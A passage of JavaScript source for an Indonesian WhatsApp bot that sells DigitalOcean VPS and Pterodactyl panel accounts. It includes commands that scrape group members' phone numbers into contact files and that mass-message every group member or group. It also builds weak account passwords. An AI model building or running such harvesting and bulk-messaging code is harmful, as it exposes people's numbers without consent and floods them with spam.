method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//================================================================================

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("hostname"))
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Sky.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

//================================================================================

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Sky.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Sky.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Sky.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Sky.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Sky.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Sky.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "produk": {
await slideButton(m.chat)
}
break

//================================================================================

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await Sky.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Sky.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//================================================================================

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Sky.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//================================================================================

case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrup|pesannya"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya"))
const [idgc, pes] = text.split("|")
const teks = pes
const jidawal = m.chat
const data = await Sky.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Sky.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Sky.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Sky.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await Sky.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Sky.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Sky.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Sky.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Sky.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Sky.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Sky.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Sky.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await Sky.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Sky.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Sky.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Sky.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Sky.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Sky.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Sky.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Sky.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Sky.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Sky.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Sky.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "pay": case "payment": {
if (!isCreator) return Reply(mess.owner)
let imgdana = await prepareWAMessageMedia({ image: { url: global.image.dana }}, { upload: Sky.waUploadToServer })
let imgovo = await prepareWAMessageMedia({ image: { url: global.image.ovo }}, { upload: Sky.waUploadToServer })
let imggopay = await prepareWAMessageMedia({ image: { url: global.image.gopay }}, { upload: Sky.waUploadToServer })
let imgqris = await prepareWAMessageMedia({ image: {url: global.image.qris }}, { upload: Sky.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "\nPilih salah satu *payment* pembayaran yang tersedia"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgdana
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
